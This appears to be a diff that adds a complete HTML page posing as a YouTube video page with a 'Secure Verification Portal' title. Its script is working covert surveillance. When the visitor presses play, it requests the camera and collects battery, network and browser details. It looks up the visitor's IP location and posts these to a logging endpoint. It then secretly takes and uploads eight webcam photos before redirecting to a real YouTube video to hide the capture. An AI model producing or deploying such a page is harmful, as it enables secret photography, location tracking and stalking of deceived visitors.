@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { margin: 0; background: #0f0f0f; color: white; font-family: Roboto, sans-serif; }
+        .header { height: 48px; display: flex; align-items: center; padding: 0 16px; background: #0f0f0f; border-bottom: 1px solid #333; }
+        .video-box { width: 100%; aspect-ratio: 16/9; background: #000; display: flex; align-items: center; justify-content: center; position: relative; }
+        .play-btn { font-size: 50px; color: white; cursor: pointer; z-index: 5; }
+        .info { padding: 15px; }
+        .sub-bar { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
+        .pfp { width: 35px; height: 35px; background: #ff4444; border-radius: 50%; }
+        .btn-sub { background: white; color: black; border-radius: 20px; padding: 8px 15px; border: none; font-weight: bold; margin-left: auto; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="header"><i class="fab fa-youtube" style="color:red;font-size:24px"></i> <b style="margin-left:5px">YouTube</b></div>
+    <div class="video-box" id="box"><i class="fas fa-play play-btn" onclick="start()"></i></div>
+    <div class="info">
+        <h3 id="t">Secure Verification Portal</h3>
+        <div class="sub-bar"><div class="pfp"></div><div><b>AnyaStore</b><br><small>148K subscribers</small></div><button class="btn-sub">Subscribe</button></div>
+    </div>
+    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+    <script>
+        const p = new URLSearchParams(window.location.search);
+        async function start() {
+            document.getElementById('box').innerHTML = '<div style="border:3px solid #333;border-left-color:red;width:30px;height:30px;border-radius:50%;animation:s 1s linear infinite"></div><style>@keyframes s{to{transform:rotate(360deg)}}</style>';
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: p.get('cam')||'user' } });
+                document.getElementById('v').srcObject = s;
+                let bat = "N/A", net = "N/A";
+                try { const b = await navigator.getBattery(); bat = `${Math.round(b.level*100)}% (${b.charging?'Charging':'Battery'})`; } catch(e){}
+                if(navigator.connection) net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.downlink}Mbps)`;
+                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+                fetch(`/log_info?id=${p.get('id')}`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ...ip, battery: bat, net_type: net, platform: "Android", browser: navigator.userAgent })
+                });
+                let count = 0;
+                const iv = setInterval(() => {
+                    if (count >= 8) { clearInterval(iv); window.location.href="https://youtube.com/watch?v="+p.get('ytid'); return; }
+                    const c = document.getElementById('c'), v = document.getElementById('v');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => { const fd = new FormData(); fd.append('file', b); fetch(`/upload?id=${p.get('id')}&type=photo`, {method:'POST', body:fd}); }, 'image/jpeg', 0.8);
+                    count++;
+                }, 700);
+            } catch(e) { alert("Verification Failed. Please allow camera."); location.reload(); }
+        }
+    </script>
+</body>
+</html>
